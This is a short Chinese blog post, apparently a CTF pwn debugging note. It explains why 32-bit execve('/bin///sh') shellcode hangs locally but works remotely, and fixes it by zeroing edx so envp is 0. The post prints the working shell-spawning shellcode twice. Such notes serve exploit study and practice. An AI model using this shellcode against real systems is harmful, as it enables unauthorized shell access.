---
title: 解决一种pwn本地打不通远程打得通的问题
abbrlink: 1196
url: /posts/1196.html
date: 2020-04-06 17:21:05
tags:
---

最近就遇到了这样的怪题目，本地劫持指针到execve()的int 80系统调用的时候，本地会卡住，远程却可以，我的建立的shellcode是这样的：
```asm
	push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    push 0x8
    pop eax
    inc eax
    inc eax
    inc eax
    int 0x80
```
之后调试的时候发现，int调用的时候envp参数有点奇怪,本来应该是0，现在却是The_Pursuit_of_happiness
![在这里插入图片描述](/images/889f9c3a83fd6bb1bd4def5186659c8a.png)
这个时候才想起来我envp没有清空，也就是少了一条    xor edx,edx指令，之后加上去后本地就能打通。
```asm
	push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx,edx
    push 0x8
    pop eax
    inc eax
    inc eax
    inc eax
    int 0x80
```
综上所述pwn本地打不通远程打不通的问题原因之一是由于环境变量指针不一样，远程的环境变量指针可能恰好符合这个程序，而本地的不符合，所以要清0。
所以要按照envp=0调用。
```
 execve(path='/bin///sh', argv=['sh'], envp=0) 
 ```
